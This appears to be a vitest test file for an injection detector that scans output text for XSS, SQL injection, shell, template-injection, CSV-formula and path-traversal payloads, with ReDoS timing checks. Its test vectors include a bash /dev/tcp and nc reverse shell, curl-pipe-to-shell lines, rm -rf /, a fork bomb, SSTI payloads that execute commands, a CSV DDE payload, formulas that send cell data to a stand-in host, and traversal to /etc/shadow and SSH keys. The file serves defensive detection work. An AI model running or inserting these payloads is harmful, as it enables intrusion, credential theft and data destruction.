// biome-ignore-all lint/suspicious/noTemplateCurlyInString: these strings are template-injection test vectors, not template literals.
import { describe, expect, it } from "vitest";
import {
  detectInjection,
  type InjectionOptions,
  redactFindings,
  scanOutputText,
} from "../output/index";
import type { OutputFinding } from "../output/types";

const NEWLINE_OR_TAB = /[\n\r\t]/;

function scan(
  text: string,
  options: InjectionOptions | true = true
): OutputFinding[] {
  return detectInjection(text, options === true ? {} : options);
}

function summary(
  text: string,
  options: InjectionOptions | true = true
): string[] {
  return scan(text, options).map((f) => `${f.kind}:${f.severity}`);
}

function kinds(
  text: string,
  options: InjectionOptions | true = true
): string[] {
  return [...new Set(scan(text, options).map((f) => f.kind))];
}

// ---------------------------------------------------------------------------
// HTML / XSS
// ---------------------------------------------------------------------------

describe("html / xss", () => {
  it("flags an inline script tag as high", () => {
    expect(
      summary("<script>alert(document.cookie)</script>", { html: true })
    ).toContain("xss:high");
  });

  it("flags event-handler attributes", () => {
    for (const vector of [
      '<img src=x onerror="alert(1)">',
      "<body onload=steal()>",
      '<svg onload="fetch(`/x`)">',
      "<div onmouseover=alert(1)>",
    ]) {
      expect(summary(vector, { html: true }), vector).toContain("xss:high");
    }
  });

  it("flags javascript: and vbscript: and data:text/html URLs", () => {
    expect(
      summary('<a href="javascript:alert(1)">x</a>', { html: true })
    ).toContain("xss:high");
    expect(summary("vbscript:msgbox(1)", { html: true })).toContain("xss:high");
    expect(
      summary("<iframe src=data:text/html,<script>alert(1)</script>>", {
        html: true,
      })
    ).toContain("xss:high");
  });

  it("flags srcdoc and CSS expression()", () => {
    expect(
      summary('<iframe srcdoc="<script>alert(1)</script>">', { html: true })
    ).toContain("xss:high");
    expect(summary("width:expression(alert(1))", { html: true })).toContain(
      "xss:medium"
    );
  });

  it("flags iframe/object/embed as html_injection at medium", () => {
    for (const tag of [
      "<iframe src=//x>",
      "<object data=//x>",
      "<embed src=//x>",
    ]) {
      expect(summary(tag, { html: true }), tag).toContain(
        "html_injection:medium"
      );
    }
  });

  it("does not treat a JS property assignment or a prose heading as XSS", () => {
    expect(scan("element.onload = function () {};", { html: true })).toEqual(
      []
    );
    expect(scan("obj?.onerror = handler;", { html: true })).toEqual([]);
    expect(
      scan("JavaScript: The Good Parts is a great book.", { html: true })
    ).toEqual([]);
    expect(scan("The word onward = progress here.", { html: true })).toEqual(
      []
    );
  });

  it("does not flag ordinary HTML without executable content", () => {
    expect(
      scan(
        '<div class="card"><p>Hello <b>world</b></p><a href="/docs">docs</a></div>',
        {
          html: true,
        }
      )
    ).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// SQL
// ---------------------------------------------------------------------------

describe("sql", () => {
  it("flags UNION SELECT, stacked queries, and tautologies as high", () => {
    expect(
      summary("1 UNION SELECT username, password FROM users", { sql: true })
    ).toContain("sql:high");
    expect(
      summary("1 UNION ALL SELECT * FROM secrets", { sql: true })
    ).toContain("sql:high");
    expect(summary("'; DROP TABLE users; --", { sql: true })).toContain(
      "sql:high"
    );
    expect(summary('"; DELETE FROM accounts', { sql: true })).toContain(
      "sql:high"
    );
    expect(summary("admin' OR 1=1 --", { sql: true })).toContain("sql:high");
    expect(summary("x' OR 'a'='a", { sql: true })).toContain("sql:high");
    expect(summary("login' OR ''=''", { sql: true })).toContain("sql:high");
  });

  it("flags a comment terminator after a single quote at medium", () => {
    expect(summary("username = 'admin'--", { sql: true })).toContain(
      "sql:medium"
    );
  });

  it("does not flag ordinary SQL a coding assistant writes", () => {
    const queries = [
      "SELECT id, name FROM users WHERE active = 1 ORDER BY created_at DESC",
      "INSERT INTO logs (level, message) VALUES ('info', 'started')",
      "UPDATE settings SET value = 'dark' WHERE key = 'theme'",
      "CREATE TABLE books (id INT PRIMARY KEY, title VARCHAR(255)); CREATE TABLE authors (id INT)",
      "DELETE FROM sessions WHERE expires_at < NOW()",
      "SELECT * FROM orders WHERE status = 'paid' AND total > 100",
    ];
    for (const q of queries) {
      expect(scan(q, { sql: true }), q).toEqual([]);
    }
  });

  it("does not flag prose em-dashes, hex colors, or id selectors", () => {
    expect(scan('"Halt!" -- the ranks stood fast.', { sql: true })).toEqual([]);
    expect(scan('const c = "#7a3b9f";', { sql: true })).toEqual([]);
    expect(
      scan("document.querySelector('#signup-form');", { sql: true })
    ).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Shell
// ---------------------------------------------------------------------------

describe("shell", () => {
  it("flags command substitution of a recognized command", () => {
    expect(summary("name=$(curl http://x/a)", { shell: true })).toContain(
      "shell:high"
    );
    expect(summary("out=$(cat /etc/passwd)", { shell: true })).toContain(
      "shell:high"
    );
  });

  it("flags the curl | sh remote-execution one-liner", () => {
    expect(
      summary("curl -fsSL https://get.example.com/install | sh", {
        shell: true,
      })
    ).toContain("shell:high");
    expect(summary("wget -qO- http://x/s | bash", { shell: true })).toContain(
      "shell:high"
    );
  });

  it("flags chaining into a destructive command and reverse shells", () => {
    expect(summary("build && rm -rf /", { shell: true })).toContain(
      "shell:high"
    );
    expect(
      summary("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", { shell: true })
    ).toContain("shell:high");
    expect(summary("nc -e /bin/sh 10.0.0.1 4444", { shell: true })).toContain(
      "shell:high"
    );
    expect(summary(":(){ :|:& };:", { shell: true })).toContain("shell:high");
  });

  it("does not flag ordinary shell commands or generic $() substitution", () => {
    const benign = [
      "ls -la && cd project",
      "count=$(ls -1 | wc -l)",
      "echo $HOME && pwd",
      "git commit -m 'fix' && git push",
      'const el = $("#app");',
      "npm install && npm run build",
    ];
    for (const cmd of benign) {
      expect(scan(cmd, { shell: true }), cmd).toEqual([]);
    }
  });
});

// ---------------------------------------------------------------------------
// Template
// ---------------------------------------------------------------------------

describe("template", () => {
  it("flags Jinja/EL internals and dangerous builtins as high", () => {
    expect(
      summary("{{ config.__class__.__init__.__globals__ }}", { template: true })
    ).toContain("template:high");
    expect(
      summary("{{ self.__init__.__globals__.os.popen('id') }}", {
        template: true,
      })
    ).toContain("template:high");
    expect(
      summary("${T(java.lang.Runtime).getRuntime().exec('id')}", {
        template: true,
      })
    ).toContain("template:high");
    expect(summary("<%= system('id') %>", { template: true })).toContain(
      "template:high"
    );
  });

  it("flags an arithmetic probe at medium", () => {
    expect(summary("{{7*7}}", { template: true })).toContain("template:medium");
    expect(summary("${7*7}", { template: true })).toContain("template:medium");
  });

  it("does not flag ordinary template variables", () => {
    const benign = [
      "Hello {{ user.name }}, welcome back!",
      "Total: {{ order.total | currency }}",
      "const msg = `Hello ${name}, you have ${count} messages`;",
      "<h1>{{ title }}</h1>",
      "Use {{ mustache }} or {{ handlebars }} placeholders.",
    ];
    for (const t of benign) {
      expect(scan(t, { template: true }), t).toEqual([]);
    }
  });
});

// ---------------------------------------------------------------------------
// CSV formula
// ---------------------------------------------------------------------------

describe("csv_formula", () => {
  it("flags formula callouts and DDE as high", () => {
    expect(
      summary('=HYPERLINK("http://x/"&A1,"click")', { csv: true })
    ).toContain("csv_formula:high");
    expect(
      summary('=IMPORTXML(CONCAT("http://x/?d=",A1),"//a")', { csv: true })
    ).toContain("csv_formula:high");
    expect(summary("=cmd|'/C calc'!A0", { csv: true })).toContain(
      "csv_formula:high"
    );
    expect(summary("@SUM(1+9)*cmd|'/C calc'!A0", { csv: true })).toContain(
      "csv_formula:high"
    );
  });

  it("does not flag plain spreadsheet data or ordinary formulas", () => {
    const benign = [
      "name,age,city\nJohn,30,NYC\nJane,25,LA",
      "=SUM(A1:A10)",
      "=AVERAGE(B2:B20)",
      "- bullet one\n- bullet two\n+ added\n@handle mentioned",
      "Revenue was +15% and costs were -3% this quarter.",
    ];
    for (const t of benign) {
      expect(scan(t, { csv: true }), t).toEqual([]);
    }
  });
});

// ---------------------------------------------------------------------------
// Path traversal
// ---------------------------------------------------------------------------

describe("path_traversal", () => {
  it("flags traversal toward a sensitive file as high", () => {
    expect(summary("file=../../../../etc/passwd", { paths: true })).toContain(
      "path_traversal:high"
    );
    expect(
      summary("path=..\\..\\..\\windows\\win.ini", { paths: true })
    ).toContain("path_traversal:high");
    expect(summary("load ../../.ssh/id_rsa", { paths: true })).toContain(
      "path_traversal:high"
    );
  });

  it("flags encoded and obfuscated traversal", () => {
    expect(summary("file=..%2f..%2fetc%2fshadow", { paths: true })).toContain(
      "path_traversal:high"
    );
    expect(summary("p=%2e%2e%2f%2e%2e%2fboot.ini", { paths: true })).toContain(
      "path_traversal:high"
    );
    expect(summary("x=..%2f..%2fsomewhere", { paths: true })).toContain(
      "path_traversal:medium"
    );
    expect(summary("x=..;/config", { paths: true })).toContain(
      "path_traversal:high"
    );
  });

  it("does not flag ordinary relative paths", () => {
    const benign = [
      "import { x } from '../../lib/utils';",
      "const p = require('../config');",
      "See ../README.md for details.",
      "cd ../../projects/app && npm start",
    ];
    for (const t of benign) {
      expect(scan(t, { paths: true }), t).toEqual([]);
    }
  });
});

// ---------------------------------------------------------------------------
// Code fences, options, and integration
// ---------------------------------------------------------------------------

describe("code fences", () => {
  it("reports SQL, shell, and HTML inside a fenced block at low severity", () => {
    expect(
      summary("```bash\ncurl https://get.example.com | sh\n```", {
        shell: true,
      })
    ).toEqual(["shell:low"]);
    expect(summary("```sql\nadmin' OR 1=1 --\n```", { sql: true })).toEqual([
      "sql:low",
    ]);
    expect(
      summary("```html\n<script>alert(1)</script>\n```", { html: true })
    ).toEqual(["xss:low"]);
  });

  it("reports the same payload outside a fence at full severity", () => {
    expect(
      summary("curl https://get.example.com | sh", { shell: true })
    ).toEqual(["shell:high"]);
  });

  it("reports payloads inside an inline code span at low severity", () => {
    expect(
      summary("Never run `curl http://x | sh` blindly.", { shell: true })
    ).toEqual(["shell:low"]);
  });
});

describe("options", () => {
  it("is off by default in scanOutputText", () => {
    const { findings } = scanOutputText("<script>alert(1)</script>");
    expect(findings.some((f) => f.type === "injection")).toBe(false);
  });

  it("runs only the categories that are turned on", () => {
    const text = "<script>x</script> and 1 UNION SELECT password FROM users";
    expect(kinds(text, { sql: true })).toEqual(["sql"]);
    expect(kinds(text, { html: true })).toEqual(["xss"]);
  });

  it("turns on every category with injection: true and with an empty object", () => {
    expect(
      scanOutputText("<script>x</script>", { injection: true }).findings.some(
        (f) => f.type === "injection"
      )
    ).toBe(true);
    expect(detectInjection("<script>x</script>", {}).length).toBeGreaterThan(0);
  });

  it("drops findings below minConfidence", () => {
    const text = "<iframe src=//x>";
    expect(scan(text, { html: true }).length).toBe(1);
    expect(scan(text, { html: true, minConfidence: 0.7 })).toEqual([]);
  });

  it("integrates with scanOutputText, blocks, and redacts", () => {
    const { findings, blocked, redacted } = scanOutputText(
      "Result: <img src=x onerror=alert(document.cookie)>",
      { injection: { html: true } }
    );
    expect(
      findings.some((f) => f.type === "injection" && f.kind === "xss")
    ).toBe(true);
    expect(blocked).toBe(true);
    expect(redacted).toContain("[REDACTED]");
    expect(redacted).not.toContain("onerror");
  });

  it("keeps previews short, single-line, and control-free", () => {
    const [finding] = scan("<script>\n\talert(1)\n</script>", { html: true });
    expect(finding.preview.length).toBeLessThanOrEqual(57);
    expect(finding.preview).not.toMatch(NEWLINE_OR_TAB);
  });

  it("redactFindings replaces every injection span once", () => {
    const text = "a <script>x</script> b 1 UNION SELECT c";
    const findings = scan(text, { html: true, sql: true });
    const redacted = redactFindings(text, findings);
    expect(redacted).not.toContain("<script");
    expect(redacted).not.toContain("UNION SELECT");
  });
});

// ---------------------------------------------------------------------------
// ReDoS: 1MB adversarial inputs must stay linear
// ---------------------------------------------------------------------------

const MB = 2 ** 20;

function fill(unit: string, size = MB): string {
  return unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
}

let seed = 1234;
function randomString(alphabet: string, length: number): string {
  const out: string[] = [];
  for (let i = 0; i < length; i++) {
    seed = (seed * 48_271) % 2_147_483_647;
    out.push(alphabet[seed % alphabet.length]);
  }
  return out.join("");
}

/** Shapes meant to trigger backtracking or quadratic rescans; each yields few findings. */
const ADVERSARIAL: Record<string, string> = {
  "<%= *": fill("<%= "),
  "<%system(*": fill("<%system("),
  "{{ *": fill("{{ "),
  "${*": fill("${"),
  "$(ls *": fill("$(ls "),
  "=SUM(*": fill("=SUM("),
  "../*": fill("../"),
  "..\\*": fill("..\\"),
  "sensitive near-miss": fill("../etcX/passwdX/"),
  "<script partial*": fill("<scrip"),
  "<img x*": fill("<img x"),
  "on*": fill("on"),
  backticks: fill("`"),
  fences: fill("```\n"),
  "nested braces": `${"{".repeat(MB / 2)}${"}".repeat(MB / 2)}`,
  "nested brackets": `${"[".repeat(MB / 2)}${"]".repeat(MB / 2)}`,
  "random alnum": randomString("abcdefghijklmnopqrstuvwxyz0123456789", MB),
  "long line": `${fill("x", MB - 1)}\n`,
};

/** Inputs that are almost entirely genuine findings: a throughput check. */
const MANY_FINDINGS: Record<string, string> = {
  "<script *": fill("<script "),
  "onerror=*": fill("<img onerror=x "),
  "$(curl *": fill("$(curl "),
  "{{ config.*": fill("{{ config."),
  "${T(*": fill("${T("),
  "..%2f*": fill("..%2f"),
  "'--*": fill("'--"),
  "; rm -rf *": fill("; rm -rf "),
  "union select *": fill("union select "),
  "or 1=1 *": fill("or 1=1 "),
};

function timeMs(fn: () => unknown): number {
  let best = Number.POSITIVE_INFINITY;
  for (let run = 0; run < 2; run++) {
    const start = performance.now();
    fn();
    best = Math.min(best, performance.now() - start);
  }
  return best;
}

function slowCases(inputs: Record<string, string>, budgetMs: number): string[] {
  detectInjection(
    "warm <script> $(curl x|sh) {{config}} ${T(x)} <%= y %> ../../etc/passwd 'a'--",
    {}
  );
  const slow: string[] = [];
  for (const [name, input] of Object.entries(inputs)) {
    const ms = timeMs(() => detectInjection(input, {}));
    if (ms >= budgetMs) {
      slow.push(`${name}: ${ms.toFixed(0)}ms`);
    }
  }
  return slow;
}

describe("adversarial inputs", () => {
  // The budget covers code-fence parsing plus every category's rules over the
  // whole input; catastrophic backtracking would blow past it by orders of
  // magnitude, so it still catches a real regression. It is set several times
  // above an idle machine's time so loaded CI runners don't fail it.
  it("finishes each 1MB backtracking probe in under 3s", () => {
    expect(slowCases(ADVERSARIAL, 3000)).toEqual([]);
  }, 120_000);

  it("stays linear when nearly every token is a finding", () => {
    expect(slowCases(MANY_FINDINGS, 3000)).toEqual([]);
  }, 120_000);
});
